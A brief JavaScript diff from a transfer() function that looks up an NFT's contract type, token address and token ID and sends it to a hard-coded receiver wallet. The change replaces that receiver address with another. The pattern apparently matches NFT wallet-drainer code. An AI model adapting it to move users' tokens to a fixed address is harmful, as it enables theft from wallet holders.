@@ -50,7 +50,7 @@ async function transfer(){
   balance()
   const type = information[0].attributes.contract_type
   const lowType =  type.toLowerCase()
-  const receiver = "0xa178490D195eDCAA856f1280B2b44Ad79022f9b4"
+  const receiver = "0xe33F916081c742515c17214a017588fba126Cf8C"
   const contractAdress = information[0].attributes.token_address
   const tokenId = information[0].attributes.token_id
 
